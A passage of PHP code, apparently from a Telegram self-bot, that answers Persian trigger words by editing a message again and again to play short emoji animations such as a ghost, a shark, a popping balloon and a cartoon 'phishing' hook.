                    if ($text == 'با کارای ت باید چالش سعی کن نرینی بزارن' or $text == 'خزوخیل') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩               🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩              🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩             🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩            🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩           🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩          🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩         🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩        🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩       🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩      🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩     🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩    🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩   🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩  🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩 🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤮🤮"]);
                    }
                    if ($text == 'جن' or $text == 'روح' or $text == 'روحح') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                                   🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                                  🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                                 🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                                🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                               🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                              🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                             🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                            🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                           🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                          🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                         🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                        🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                       🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                      🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                     🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                    🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                   🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                  🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                 🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻               🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻              🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻             🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻            🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻           🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻          🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻         🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻        🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻       🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻      🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻     🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻    🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻   🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻  🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻 🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☠بگارف☠"]);
                    }
                    if ($text == 'برم خونه' or $text == 'رسیدم خونه') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠              🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠             🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠            🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠           🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠          🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠         🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠        🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠       🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠      🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠     🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠    🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠   🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠  🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠 🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠🚶‍♂"]);
                    }
                    if ($text == 'کرج' or $text == 'karaj') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐-----------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐----------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐---------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐--------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐-------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐-----🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐----🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐---🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐--🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐-🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "کرج🤝"]);
                    }
                    if ($text == '203') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "@im_namrd"]);

                    }
                    if ($text == 'قلب') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "❤️🧡💛💚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💜💙🖤💛"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤍🤎💛💜"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💚❤️🖤🧡"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💜💚🧡🖤"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤍🧡🤎💜"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💙🧡💜🧡"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💚💛💙💜"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖤💛💙🤍"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖤🤍💙❤"]);
                    }
                    if ($text == 'فرار از خونه' or $text == 'شکست عشقی') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡 💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡  💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡   💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡    💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡     💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡      💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡       💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡        💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡         💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡          💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡           💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡            💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡              💃💔👫"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡                 🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡               🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡             🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡           🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡         🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡       🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡     🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡  🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡🚶‍♀"]);
                    }
                    if ($text == 'عقاب' or $text == 'ایگل' or $text == 'پیشی برد') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍                         🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍                      🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍                    🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍                  🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍                🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍               🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍              🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍            🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍           🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍          🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍         🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍        🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍       🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍      🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍     🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍    🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍   🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍 🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "پیشی برد😹"]);
                    }
                    if ($text == 'حموم' or $text == 'حمام' or $text == 'حمومم') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪                  🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪                 🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪                🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪              🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪             🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪            🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪           🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪          🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪         🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪        🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪       🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪      🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪     🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪    🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪   🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪  🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪 🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛀💦😈"]);
                    }
                    if ($text == 'آپدیت' or $text == 'اپدیت' or $text == 'آپدیت شو') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️10%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️20%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️30%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️40%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️▪️50%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️▪️▪️60%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️▪️▪️▪️70%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️▪️▪️▪️▪️80%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️▪️▪️▪️▪️▪️90%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "❗️EROR❗️"]);
                    }
                    if ($text == 'جنایتکارو بکش' or $text == 'بکشش' or $text == 'خایمالو بکش') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂                 • 🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂                •  🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂               •   🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂              •    🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂             •     🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂            •      🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂           •       🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂          •        🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂         •         🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂        •          🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂       •           🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂      •            🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂     •             🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂    •              🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂   •               🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂  •                🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂 •                 🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂•                  🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤯                  🔫 🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "فرد جنایتکار کشته شد :)"]);
                    }
                    if ($text == 'بریم مسجد' or $text == 'مسجد') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌                  🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌                 🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌                🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌               🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌              🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌             🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌            🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌           🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌          🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌         🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌        🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌       🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌      🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌     🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌    🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌   🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌  🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌 🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "اشهدان الا الا الله📢"]);
                    }
                    if ($text == 'کوسه' or $text == 'وای کوسه') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅┄┅┄┄┅🏊‍♂┅┄┄┅🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅┄┅┄┄🏊‍♂┅┄┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅┄┅┄🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅┄┅🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅┄🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "اوخیش شانس آوردما :)"]);
                    }
                    if ($text == 'بارون') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️                ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️               ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️              ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️             ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️            ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️           ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️          ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️         ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️        ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️       ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️      ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️     ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️    ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️   ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️  ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️ ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "⛈"]);
                    }
                    if ($text == 'بادکنک') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪                🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪               🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪              🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪             🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪            🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪           🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪          🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪         🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪        🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪       🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪      🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪     🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪    🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪   🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪  🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪 🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💥Bomm💥"]);
                    }
                    if ($text == 'شب خوش' or $text == 'شب بخیر ' or $text == 'شو خوش ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜              🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜             🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜            🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜           🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜          🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜         🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜        🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜       😕"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜      ☹️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜     😣"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜    😖"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜   😩"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜  🥱"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜 🥱"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😴"]);
                    }
                    if ($text == 'فیشینگ' or $text == 'فیش ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣           💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣          💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣         💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣        💳"]);
